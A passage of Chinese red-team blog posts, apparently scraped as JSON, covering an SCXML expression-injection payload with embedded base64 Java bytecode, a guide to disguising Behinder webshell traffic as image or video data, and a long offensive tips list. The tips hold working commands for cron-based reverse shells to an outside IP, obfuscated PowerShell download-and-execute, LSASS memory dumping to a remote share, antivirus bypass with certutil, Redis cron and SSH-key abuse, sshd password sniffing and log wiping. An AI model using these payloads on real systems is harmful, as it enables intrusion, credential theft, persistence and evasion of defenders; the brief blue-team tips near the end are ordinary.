mxldFJlcXVlc3QMAIwAjQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BABlmaW5kV2ViQXBwbGljYXRpb25Db250ZXh0AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAcAiQwAjgCPAQAQamF2YS9sYW5nL09iamVjdAcAkAwAkQCSAQBAb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1NlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwwAkwCUDACVAJYBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dAEAUm9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQubXZjLm1ldGhvZC5hbm5vdGF0aW9uLlJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcMAJcAmAEAPm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nAQAob3JnL3NwcmluZ2ZyYW1ld29yay9iZWFucy9CZWFuc0V4Y2VwdGlvbgEATm9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQubXZjLmFubm90YXRpb24uRGVmYXVsdEFubm90YXRpb25IYW5kbGVyTWFwcGluZwwAmQCaBwCbDACcAJ0BABNqYXZhL3V0aWwvQXJyYXlMaXN0AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwAngCfDACgAKEHAKIMAKMApAwApQCmAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBABBqYXZhL2xhbmcvU3RyaW5nBwCnDACoADoBADZ5c29zZXJpYWwucGF5bG9hZHMudGVtcGxhdGVzLlNwcmluZ0ludGVyY2VwdG9yVGVtcGxhdGUMAKkAqgwAqwCLDACsAK0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAGSW5qZXh0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAJbG9hZENsYXNzAQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaACEALAANAAAAAAACAAEALQAuAAEALwAAADMAAQABAAAABSq3AAGxAAAAAgAwAAAACgACAAAAMAAEADIAMQAAAAwAAQAAAAUAMgAzAAAACAA0AC4AAQAvAAAC4gAGAAoAAAEOEgJLEgO4AAROLRIFBL0ABlkDEgdTtgAITKcAFToELRIKBL0ABlkDEgtTtgAITCsEtgAMKwEEvQANWQO4AA7AAA+2ABBTtgARwAASOgQSE7gABDoFGQQZBbkAFAIAwAAVTacAGToFEhe4AAQ6BhkEGQa5ABQCAMAAFU0SFRIYtgAZOgUZBQS2ABoZBSy2ABvAABw6BhIdtgAewAAdKrYAHzoHuAAgtgAhOggSIhIjB70ABlkDEiRTWQQSJVNZBbIAJlNZBrIAJlO2AAg6CRkJBLYADBkJGQgHvQANWQMSJ1NZBBkHU1kFA7gAKFNZBhkHvrgAKFO2ABFXGQYZCBIntgAptgAetgAqV6cABE6xAAMACQAZABwACQBNAGEAZAAWAAMBCQEMACsABAAwAAAAagAaAAAAEQADABUACQAXABkAGgAcABgAHgAZAC4AGwAzABwATQAeAFQAHwBhACMAZAAgAGYAIQBtACIAegAkAIMAJQCJACYAlAAnAKIAKACqACkAzQAqANMAKwD5ACwBCQAuAQwALQENAC8AMQAAAKIAEAAZAAMANQA2AAEAHgAQADcAOAAEAFQADQA5ADoABQBhAAMAOwA8AAIAbQANAD0AOgAGAGYAFAA+AD8ABQAJAQAAQAA6AAMATQC8AEEAQgAEAIMAhgBDAEQABQCUAHUARQBGAAYAogBnAEcASAAHAKoAXwBJAEoACADNADwASwA2AAkALgDeADUANgABAHoAkgA7ADwAAgADAQoATABNAAAATgAAACoABABUAA0AOQBPAAUAbQANAD0ATwAGAAkBAABAAE8AAwCUAHUARQBQAAYAUQAAAGIABv8AHAAEBwBSAAAHAFMAAQcAVP8AEQAEBwBSBwBVAAcAUwAA/wA1AAUHAFIHAFUABwBTBwBWAAEHAFf/ABUABQcAUgcAVQcAWAcAUwcAVgAA/wCRAAEHAFIAAQcAWfoAAAABAFoAAAACAFs=\\';var bytecode;try{var clsBase64 = classLoader.loadClass(\\'java.util.Base64\\');var clsDecoder = classLoader.loadClass(\\'java.util.Base64$Decoder\\');var decoder = clsBase64.getMethod(\\'getDecoder\\').invoke(base64Clz);bytecode = clsDecoder.getMethod(\\'decode\\', clsString).invoke(decoder, bytecodeBase64);} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass(\\'javax.xml.bind.DatatypeConverter\\');bytecode = datatypeConverterClz.getMethod(\\'parseBase64Binary\\', clsString).invoke(datatypeConverterClz, bytecodeBase64);} catch (eee) {var clazz1 = classLoader.loadClass(\\'sun.misc.BASE64Decoder\\');bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);}}var clsClassLoader = classLoader.loadClass(\\'java.lang.ClassLoader\\');var clsByteArray = (new java.lang.String(\\'a\\').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(\\'defineClass\\', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();}')&quot; /&gt; &lt;/onentry&gt; &lt;/state&gt; &lt;/scxml&gt; 0x03 其他标签： &lt;assign&gt;标签 &lt;?xml version=&quot;1.0&quot;?&gt; &lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot;&gt; &lt;state id=&quot;example&quot;&gt; &lt;onentry&gt; &lt;assign location=&quot;test&quot; expr=&quot;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'open -a calculator')&quot;/&gt; &lt;/onentry&gt; &lt;/state&gt; &lt;/scxml&gt; &lt;log&gt;标签： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot;&gt; &lt;state id=&quot;example&quot;&gt; &lt;onentry&gt; &lt;log expr=&quot;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'open -a calculator')&quot;/&gt; &lt;/onentry&gt; &lt;/state&gt; &lt;/scxml&gt; &lt;raise&gt;标签： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;scxml xmlns=&quot;http://www.w3.org/2005/07/scxml&quot; version=&quot;1.0&quot;&gt; &lt;state id=&quot;state1&quot;&gt; &lt;transition target=&quot;state2&quot;/&gt; &lt;/state&gt; &lt;state id=&quot;state2&quot;&gt; &lt;onentry&gt; &lt;log expr=&quot;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'open -a calculator')&quot;/&gt; &lt;/onentry&gt; &lt;/state&gt; &lt;state id=&quot;state3&quot;&gt; &lt;onentry&gt; &lt;raise event=&quot;myevent&quot;/&gt; &lt;/onentry&gt; &lt;/state&gt; &lt;transition target=&quot;state1&quot; event=&quot;myevent&quot;/&gt; &lt;/scxml&gt; ","link":"https://1oecho.github.io/LfXdtONwu/"},{"title":" 红队开发: Behinder3-Beta11 实战下的二次开发 （3）","content":"0x01 实现功能 封装各类传输的数据头，PNG/AVI/JPEG 实现自定义的webshell的连接 0x02 实现细节： 数据传输过程中的修改方式，原版webshell不需要修改 为了我们后续实际使用方便，直接新建一个webshell连接类型，按照我们的需要，后续直接修改对应的类型即可 1. 首先我们复制原版jsp下的类，新建一个自定义的webshell类型,以diy_jsp为例： 修改webshell各类功能在传输过程中的加密方法，你用到的所有功能都需要修改，意味着所有的类都需要修改下，具体修改DIY类型下所有的Encrypt（）方法 （觉得麻烦的话，完全可以自定义一个Encrypt方法，后续所有的功能直接调用你新增的方法即可） 原版直接获取字节码，我们修改就将，新增数据拼接到原数据前后即可，以视频流的开头为例：（想添加什么头，自己定义即可） 前： UklGRmYKAQBBVkkgTElTVMAAAABoZHJsYXZpaDgAAAA1ggAAoDwAAAAAAAAQCAAAoQAAAAAAAAABAAAABw8AALgBAAB8AQ 新增bytep[]长度：72 后： /9k= 新增 byte[] 长度：2 2. 修改Params.java的逻辑，使我们新创建的类型能够在实现功能时，调用到对应的类,直接复制原版的函数，新建一个，修改下路径/方法名即可 3. 修改原有的加解密方法，我们只封装一个文件头测试，实际可以自定义加解密方法，以及webshell的实现流程 新增一个解密方法，大致逻辑不变，只修改我们在本地接class字节码的有效范围，原版直接解密获取到字节码，修改版我们需要去掉新增文件头的那部分数据，只取有效的哪部分即可： 新增数据： 开头-byte[] 长度72 后部分 byte[] 长度 2 新建解密方法，取的时候，定义好取的部分即可 新增静态方法中的调用 4. 最后一步，修改UI下的方法，以及Utils下的插件调用功能 新增连接选项 获取插件数据的方法，新增即可 运行Main方法，发现已经成功添加新类型，我们后续的传输就按照自定义的方式去进行了， 实战发挥脑洞，修改加解密方法，修改参数获取方法，修改传输过程中方式等等.... 数据传输 0x03 实际使用 将所有数据进行混淆，修改加解密方法 修改为参数传递，不直接传输数据，改为各类参数传递，伪造为正常业务流量 ","link":"https://1oecho.github.io/fjA1kdB4U/"},{"title":"攻防实战：实战TIPS集合（持续更新）","content":"[TOC] 红队 JAR 抓包 java -DproxySet=true -DproxyHost=127.0.0.1 -DproxyPort=8888 -jar 你的jar包 Powershell免杀，案例： cmd /c echo set-alias -name xz -value IEX;x^z (New-Object &quot;NeT.WeBClienT&quot;).d^o^w^n^l^o^a^d^s^t^r^i^n^g('ht'+'tP://19’+'2.168.190.12'+'8/ a') | p^o^w^e^r^s^h^e^l^l - 简易的Linux键盘记录： # 添加倒数第二行即可，结果查看/tmp/test if [ -f /tmp/script.lock ];then rm /tmp/script.lock else echo lock &gt; /tmp/script.lock exec script -B /tmp/test -aqf fi 苛刻Windows命令执行： 这个方法在内网中比较常用吧，有个命令执行的点，有360一类的杀软， 又不好写shell，可以直接利用comsvcs.dll 的导出函数dump lsass内存， 把结果放到目标web目录下，下载解密即可。 https://twitter.com/PythonResponder/status/1385064506049630211 Remote LSASS dump without touching local disk? Yes 😃 On target run: net use x: \\smbserver_under_your_control\\c$ powershell -c rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).id x:\\lassdump.bin ful java任意文件读取，获取源码方式 # 读取文件： /var/lib/mlocate/mlocate.db # 筛选对应war包即可 查找web路径： 方法一 ：打开web查看源码，复制一个特征字符串，然后替换进下面命令的htmlString搜索之。 Win ：findstr /s/i/n /d:E:\\code\\xampp\\htdocs\\ /c:”htmlString” *.* Linux：find / -name “.” | xargs grep”htmlString” 方法二 ：对于linux系统，我们也可以尝试通过history命令去查找，同样的也可以去看.bash_history history | grep -E ‘cd|vi|ed|nano|et|mkdir|rm|find|ls|mv’ |grep -v grep | grep -E ‘www|html|nginx|apache|php|lighttp|web’ -i 方法三 ：windows系统中也可以使用dir去匹配一个特征文件名 dir /s/a-d/b E:\\code\\xampp\\htdocs\\*重复度较低的文件名（支持通配符 Linux短期权限维持 (crontab -l;echo '*/60 * * * * rm /tmp/yum.log;mkfifo /tmp/yum.log;cat /tmp/yum.log|/bin/sh -i 2&gt;&amp;1|/usr/bin/nc -w 3 118.118.118.118 53 &gt;/tmp/yum.log')|crontab - (crontab -l;echo '*/5 * * * * rm /tmp/yum.log;mkfifo /tmp/yum.log;cat /tmp/yum.log|/bin/sh -i 2&gt;&amp;1|/usr/bin/nc 118.118.118.118 53 &gt;/tmp/yum.log')|crontab - (crontab -l;echo '*/1 * * * * exec 9&lt;&gt; /dev/tcp/118.118.118.118/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i')|crontab - 简单操作 unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0 python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)' ssh -C -f -N -g -R 3389:10.0.0.1:3389 gg@118.118.118.118 plink.exe -C -N -R 3389:127.0.0.1:3389 gg@118.118.118.118 -pw 123456 -P 443 set 0 &quot;\\n\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/118.118.118.118/53 0&gt;&amp;1\\n\\n\\n&quot; config set dir /var/spool/cron config set dbfilename root save config set dir /var/lib/redis config set dbfilename dump.rdb cat foo.txt | redis-cli -h 10.10.10.10 -x set 0 config set dir /root/.ssh config set dbfilename &quot;authorized_keys&quot; Windows 文件下绕过360方式： # 证书下载绕过： 1. 将路径下的certutil.exe ，复制出来，利用复制出的新的进行下载操作，并列执行俩次 copy C:\\Windows\\System32\\certutil.exe sb.exe sb.exe&amp;&amp;sb.exe -urlcache -split -f http://vpsIP/a.txt &amp;&amp; a.exe 2. 修改下载的路径，通过定义变量，拼接变量，来下载文件 3. 通过echo写入一个exe的hex编码，通过certutil.exe转为exe openssl 反弹 加密webshell ＃ 生成自签名证书 openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes ＃ 服务端启动监听 8888端口： openssl s_server -quiet -key key.pem -cert cert.pem -port 8888 ＃ Ｌinux 反弹ｓｈｅｌｌ： mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect Your ip:Your port&gt; /tmp/s; rm /tmp/s Sqlmap mssql-时间盲注/布尔盲注 写webshell # Windows 环境： 1. 找一个 特征文件： nb.jsp 2. dir /s /b index_sb.asp # 确定路径 3. for /r &quot;D:&quot; %i in (*.ashx) do echo %i # 第二种确定路径的方式 4. 直接echo vcenter 1. getshell后通过dump内存，查找登录密码 run procdump64.exe -accepteula -ma vpxd.exe vpxd.dmp 2. 通过`PySharpSphere`dump内部主机Hash，上线 https://github.com/RicterZ/PySharpSphere 3. 通过dump数据库，获取Cookies，伪造登录 https://github.com/horizon3ai/vcenter_saml_login 提取页面中URL： var urls=$$('a');for(url in urls){console.log(&quot;%c#&quot;+url+&quot; - %c&quot;+urls[url].innerHTML +&quot; -- %c&quot;+urls[url].href,&quot;color:red;&quot;,&quot;color:green;&quot;,&quot;color:blue;&quot;);} 搜索引擎语法：https://blog.csdn.net/weixin_45116657/article/details/102761464 红队 拿下 linux 机器,可以运行下 last 如果是内网机器,可以发现运维管理员的 ip 段,精准定位目标 也可以看下防火墙信息 iptables --list 也会有所收获 翻数据库密码可以注意 history 记录也可以看下 /root/.mysql_history 文件 偶尔跑1、2个脚本安装一下模块还是挺恼人的 如果经常写 python 脚本,可以使用 pipreqs 生成自己的 requirements.txt 文件,这样方便在更换主机的时候快速部署好运行环境 浏览器内打开 cmd ms-settings:clipboard?activationSource= 火狐 telnet:/// irc:/// ircs:/// mailto:/// webcal:/// 有 wsdl/soap 不知道怎么测?除了老版本awvs以外可以使用 soapui 直接抓取目标接口,也可用 burp 插件 Wsdler 避免记录登录日志的小技巧 ssh -T user@host /bin/bash -i -T 代表不要分配 tty，-i 代表要一个交互型的 bash 来自文章 : Linux 系统日志小结 如何关闭 http://burp 防止蜜罐探测 Proxy - Options - Miscellaneous - Disable web interface at http://burp 检测暗链的小技巧,使用爬虫的 user-agent 遍历访问目标,对比 title 和内容 https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/Spider.txt DNS收集的优先级 被动+爬取+过滤 &gt; 主动扫描+爆破 可以使用这种思路 rapid7公共数据集+js爬取+Github等第三方爬取+subfinder+OneForAll+ksubdomain过滤 对于未知的webshell，可以尝试爆破路径、密码 webshell路径字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/Webshell/Fuzz_dir.txt webshell密码字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/Webshell/Fuzz_webshell_pass.txt 也加一些参数,尝试报错,看会不会有密码 nc 用的不爽可以尝试换个 reverse-shell 工具,推荐个 https://github.com/nodauf/Girsh ,go写的,可以自动检测OS并执行正确的命令，将其升级为一个完整的交互式反向shell。 从反编译的 apk 文件中提取相关域名链接/IP grep -E &quot;([0-9]{1,3}[\\.]){3}[0-9]{1,3}&quot; -r xxx --color=auto grep -E &quot;https?://[a-zA-Z0-9\\.\\/_&amp;=@$%?~#-]*&quot; -r xxx --color=auto 通过正则从 apk 中提取一些敏感信息 apktool d app_name.apk grep -EHirn &quot;accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into&quot; APKfolder/ 如果登录系统设置了 IP 地址白名单,我们可以通过修改 http 头字段伪造 IP 地址 http 头字段字典 : https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/Fuzz_head.txt 或者直接修改 host 头 curl -v -H &quot;Host: localhost&quot; https://target/ wget -d --header=&quot;Host: localhost&quot; https://target/ 有时候文件太大,想先确认一下文件结构和部分内容,这时可以使用 remotezip,直接列出远程 zip 文件的内容，而无需完全下载,甚至可以远程解压,仅下载部分内容 pip3 install remotezip remotezip -l &quot;http://site/bigfile.zip&quot; # 列出远程zip文件的内容 remotezip &quot;http://site/bigfile.zip&quot; &quot;file.txt&quot; # 从远程zip⽂件解压出file.txt URL跳转漏洞字典: https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api_param/Fuzz_Redirect.txt burp 在忽略目标的时候是配置 Intercept Client Requests , 但是这个选项不支持批量导入, 只能一条一套的添加, 非常反人类, 所以 windows 下可以通过 Proxifier 配置 Rules 做到忽略指定的 host 附赠一个 Target hosts 列表 https://github.com/ffffffff0x/AboutSecurity/blob/master/Payload/Burp/Proxifier_filter.txt npm 和 github 加速可以使用 jsdelivr 的 cdn 进行加速,但 jsdelivr 不支持 release 的发布文件下载,可以采用 cf worker 部署的代理服务进行加速 在 linux 中不知道当前用户可用什么命令，可以使用下面的命令，这条命令可以列出所有可用的命令(有点拗口) compgen -c 火绒拦截扫描，如何关闭拦截？ 火绒&gt;网络防护&gt;基础防护中关闭 druid 未授权访问常见路径 /druid/websession.html /system/druid/websession.html /webpage/system/druid/websession.html 爆破目标用户名时应考虑如下可能： 撞库 常见手机号 常见登录账号(admin、manager、test、deme) 数字组合(0-9、00-99、000-999、0000-9999、00000-99999) 拼音(zhangsan、zhang.san、zhangs) 中文(张三、李四、张san) 英文名(Tom、Jeo、Cherry) 单位名(zssx123、zssx@123) 地名(beijing123、beijing@123) 组合(地名+单位名) 域名(baidu@123、JD@123) 生日组合 整理字典时，推荐用linux下的工具快速合并和去重 cat file1.txt file2.txt fileN.txt &gt; out.txtsort out.txt | uniq &gt; out2.txt 信息收集小技巧，仔细观察目标页面的js路径，多找几个js目录，专门用js字典进行爆破，获取的js脚本列表，再调用工具去匹配路径和凭证。 有时一些上传点没有过滤,但你访问文件是通过函数调用获取文件,这个时候可以先测下任意文件读,然后尝试get改为post在测试任意文件读,如果存在,尝试通过任意文件读找路径 打某一个行业想要有成果，最好要深入了解这个行业，我举个例子，比如搞传奇/dnf这种私服的，他们讲管理员都叫gm，不像搞IT的叫admin，那你爆一些私服游戏的网页后台、管理账号就需要搞一些行业黑话生成一下，比如/gm/或者/chongzhi/gm.php,用IT行业的字典，水土不服🤣，还有菠菜行业，注册用户需要6位邀请码，很多都是888888、666666这种吉利数字，逆向一下思路，猜一猜目标受众喜欢什么。 我们在后渗透过程中经常要传 payload 到目标，临时起的文件服务器都是 python 一条命令的事 Python 2.x python -m SimpleHTTPServer 8000# 在当前目录起个 8000 端口的 HTTP 服务 Python 3.x python -m http.server 8000 --bind 0.0.0.0 推荐一个可以加密码的，一条命令python服务器模块 pip3 install updogupdog --port 8888 --password test1234 一般来说,某些场景多个服务是协同的关系,比如就这个 LiveCMS 服务一定和下面的监控设备有连接，不然日志不会这么大，可以搞一搞下级监控，也可以专门搞一搞这个 LiveCMS 和 LiveSMS、LiveGBS 试试 LiveCMS 端口使用 TCP 端口 : 5060(SIP), 10000(HTTP), 26379(Redis) UDP 端口 : 5060(SIP) LiveSMS : SIP 流媒体服务, 根据需要可部署多套 TCP 端口 : 5070(SIP), 10001(HTTP), 11935(RTMP Live), 30000-40000(RTP over TCP) UDP 端口 : 5070(SIP), 50000-60000(RTP/RTCP over UDP) 有时候我们拿了一台 docker 机器，发现没有 ifconfig 命令也没有 ip 命令，不清楚怎么看 IP，这时候可以通过查看 proc 文件的方式来查看 cat /proc/net/fib_triecat /etc/sysconfig/network 渗透时遇到某些上传点未作过滤，但负载均衡做了过滤后缀名的情况，可以上传 webshell 命名为 index.php，然后访问 xxx.com/xxx/upload, 尝试 bypass 反代的策略 当渗透时遇到了 403 或者 302、401 的拒绝访问，不要怕，多 FUZZ 几次 从 HTTP Header 层面 bypass GET /admin HTTP/1.1Host: web.com # ===&gt; 403GET /anything HTTP/1.1Host: web.comX-Original-URL: /admin # ===&gt; 200GET /anything HTTP/1.1Host: web.comReferer: https://web.com/admin # ===&gt; 200GET https://qq.com HTTP/1.1Host: web.com # ===&gt; SSRF 从 URL 参数层面 bypass /admin/panel # ===&gt; 403/admin/monitor # ===&gt; 200/admin/monitor/;panel # ===&gt; 302 web.com/admin # ===&gt; 403web.com/ADMIN # ===&gt; 200web.com/admin/ # ===&gt; 200web.com/admin/. # ===&gt; 200web.com//admin// # ===&gt; 200web.com/./admin/./ # ===&gt; 200web.com/./admin/.. # ===&gt; 200web.com/%2f/admin/ # ===&gt; 200web.com/admin.json # ===&gt; 200(ruby)web.com/%2e/admin # ===&gt; 200web.com/%252e/admin # ===&gt; 200web.com/%ef%bc%8fadmin # ===&gt; 200web.com/admin # ===&gt; 302web.com/admin..;/ # ===&gt; 200 从协议层面 bypass http://web.com/admin # ===&gt; 403https://web.com/admin # ===&gt; 200 当我们拿下 windows 机器时可以通过抓内存中的密码进行横向，但 linux 却不可能抓到内存中的密码，但是 Debian 系列下的 linux 系统可以通过监听 sshd 进程的数据抓取出明文密码，比如你拿下了一台管理员机器，上面有 xshell，你可以手动开一个监听，在开一个登录，监听的窗口上就抓出密码了 strace -xx -fp `cat /var/run/sshd.pid` 2&gt;&amp;1| grep --line-buffered -P 'write\\(\\d, &quot;\\\\x00' | perl -lne '$|++; @F=/&quot;\\s*([^&quot;]+)\\s*&quot;/g;for (@F){tr/\\\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie' 当然你也可以直接用工具抓 xshell 存的密码 Arvanaghi/SessionGopher - 使用 WMI 提取 WinSCP、PuTTY、SuperPuTTY、FileZilla 和 Microsoft remote Desktop 等远程访问工具保存的会话信息的 ps 脚本 uknowsec/SharpDecryptPwd - 对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品(Xshell,Xftp)。 渗透时尽量不要暴露自己的 IP 地址，挂代理是必须的 linux 下要查看自己终端是否走代理可以 curl https://ifconfig.me/ 看下返回的 IP 地址 windows 就直接访问 https://ifconfig.me/ 即可 linux 下代理不用多说, proxychains-ng，windows 下推荐用 Proxifier MSF 和 CS 中 Stage 与 Stageless 的区别 Stage ： 先传一个 shellcode，然后回连端口，加载恶意 metsrv，然后再请求 stdapi 于 priv，进行上线 Stageless ： 将 shellcode、metsrv、stdapi、priv 打包，一次性传完 如果想让 msf 直接回弹到 NC，那么必须要用 stageless 判断目标主机是不是虚拟机、容器 windows cmd : systeminfo Powershell : get-wmiobject win32_computersystem | fl model linux lshw -class system | grep -i VM &amp; grep -i virtualdmesg | grep -i VM &amp; grep -i virtualdmidecode -s system-product-namels /tmpsystemd-detect-virtvirt-whatls -alh /.dockerenvcat /proc/1/cgroup msf 框架其实有许多 UI 界面的工具, 可以帮助不习惯命令行的渗透测试人员进行渗透，我举几个例子 https://github.com/FunnyWolf/Viper https://github.com/WayzDev/Kage 在进行云主机后渗透时，如果触发敏感操作，会有短信提醒到管理员手机上，这个时候可以酌情考虑卸载云主机的监控 (有时你用云主机装 SSR 会无法连接也是这个原因) rlwrap 工具，可以完美解决各类 shell 中无法上下左右的问题 例如 ，回弹了 shell，手贱按了上，这种情况(我想你一定遇到过🤣🤣🤣🤣) 安装： apt install rlwrap 使用： rlwrap [Command] cAdvisor 是 Google 出品的用于监控 Docker 容器的服务，渗透时遇到这个服务基本上是存在容器环境 新版 kali 2020 版后使用 root 账号默认不给密码，如果你想,可以直接进行修改 : sudo passwd root nc 具有多个版本, 比如: traditional、openbsd、ncat traditional 最老的版本,支持最基本的功能 openbsd 安全版本,回弹要用一大段命令 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 4242 &gt;/tmp/f ncat 新版本, 重构了旧版的代码并支持了许多新功能, debian 系列发行版下通过以下命令进行安装配置 apt install -y ncatupdate-alternatives --set nc /usr/bin/ncat 程序溢出，int 最大值为 2147483647，可尝试使用该值进行整数溢出，观察现象。 来自项目 : Power7089/PenetrationTest-Tips 图片验证码可设置为空，如：code=undefined 来自项目 : Power7089/PenetrationTest-Tips 也可以使用字典进行 fuzz https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/api_param/Fuzz_imagesize.txt 任意文件下载：/porc/self/cmdline -- 当前进程的 cmdline 参数，/var/lib/mlocate/mlocate.db -- 全文件路径。 来自项目 : Power7089/PenetrationTest-Tips 138888888889 12 位经过短信网关取前 11 位，导致短信轰炸 短信轰炸绕过：手机号前加 + 86 有可能会绕过，手机号输入邮箱，邮箱处输入手机号 手机号码前后加空格，86，086，0086，+86，0，00，/r,/n, 以及特殊符号等 手机号前加若干 + 会造成短信轰炸 获取短信验证码时，用逗号隔开两个手机号，有可能两个手机号能获取到同一个验证码 来自项目 : Power7089/PenetrationTest-Tips 蓝队 流量分析除了 wireshark 用科来的工具进行分析也是个不错的选择，有时候做 ctf 的分析题，直接用科来工具打开就可以发现异常包，还是挺有帮助的 CobaltStrike 的 Fofa 语法 cert=&quot;73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F&quot; 红队常用的扫描器特征 https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/RedTeam.txt &quot;Beacon.dll&quot;、&quot;beacon.x64.dll&quot; 和 &quot;ReflectiveLoader&quot; 默认是 CS Beacon 的硬编码特征。当寻找内存中的后门时，可以利用这一点 Linux 当运行一个程序发现缺少库时,可以使用 apt-file 进行搜索，然后安装对应的软件包 apt install apt-fileapt-file updateapt-file search &lt;xxx&gt;apt install &lt;xxx&gt; 来自项目 : firmianay/Tips-for-Geek 用于文本处理的几个工具 tr : 多功能处理 https://github.com/tomnomnom/anew : 自动去重 jq : json 格式化 expand/unexpand : 空格和 TAB 转换 命令行下截图的一种不错的方式 asciinema 神器级工具,Linux 下的 everything https://github.com/junegunn/fzf 推荐一个 linux 小工具 trash-cli 用于移动文件到回收站，同时会记录文件的原地址、删除日期和权限。trash-cli 和 KDE、GNOME、XFCE 使用同一个回收站，你可以在命令行或脚本运行 trash-cli。一定程度上可以代替 rm 地址:https://github.com/andreafrancia/trash-cli/blob/master/README_zh-CN.rst 一个探针工具，可用于实时监测服务器运行状况 